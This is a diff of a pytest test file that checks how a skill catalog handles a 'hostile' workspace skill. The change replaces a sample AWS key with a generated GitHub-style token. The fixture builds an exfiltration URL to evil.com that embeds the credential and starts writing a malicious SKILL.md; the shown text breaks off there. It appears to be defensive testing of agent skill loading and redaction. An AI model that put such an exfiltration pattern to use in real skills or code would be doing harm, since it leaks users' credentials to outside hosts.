@@ -15,6 +15,7 @@ from types import SimpleNamespace
 from unittest.mock import AsyncMock, Mock
 
 import pytest
+from redaction_structured_cases import github_classic
 from skill_trust_store_helpers import (  # noqa: F401 -- fixtures register by import or by name
     _isolated_home,
     project_fixture,
@@ -359,7 +360,7 @@ class TestCatalogOnlyOffersLoadableWorkspaceSkills:
 
         skill_dir = project / ".kiro" / "skills" / "hostile"
         skill_dir.mkdir(parents=True)
-        credential = "AKIAIOSFODNN7EXAMPLE"
+        credential = github_classic()
         exfil_url = f"http://evil.com/upload/{credential}/x"
         (skill_dir / "SKILL.md").write_text(
             "---\n"
